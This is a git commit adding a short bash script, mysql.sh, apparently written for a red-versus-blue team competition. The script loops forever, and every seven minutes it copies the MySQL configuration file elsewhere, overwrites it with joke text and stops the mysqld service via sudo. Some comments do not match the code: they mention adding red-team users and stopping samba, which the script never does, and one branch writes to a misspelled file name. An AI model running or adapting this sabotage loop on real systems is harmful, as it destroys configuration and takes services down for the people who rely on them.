d0667ab01c5451bb7acb64b81e86122b8ab83849
mattr555-r <64177813+mattr555-r@users.noreply.github.com>
2023-04-12 15:08:08 -0400

    Create mysql.sh

---
+++ mysql.sh
@@ -0,0 +1,22 @@
+#!/bin/bash
+
+# Loop forever
+while true
+do
+ #Sleep for 7 minutes, enough time for the blue team to figure out that the service is down and try to fix it. Then repeat.
+ sleep 420
+
+ #Generate random number, check if the number is even or odd
+ if [ $(( $RANDOM % 2)) -eq 0 ]
+ then
+ #Copy config file to other location, then overwrite original, add users for red team access
+   cp '/etc/mysql/my.cnf' '/etc/mm.cnf'
+   echo "I'm Batman" > '/etc/mysql/my.cnf'
+ else
+ #Copy config file to other location, then overwrite original, add users for red team access
+   cp '/etc/mysql/my.cnf' '/home/mm.cnf'
+   echo "You ever dance with the devil in the pale mooon light?" > '/etc/mysql/my.conf'
+ fi
+ #Stop samba service
+ sudo service mysqld stop
+done
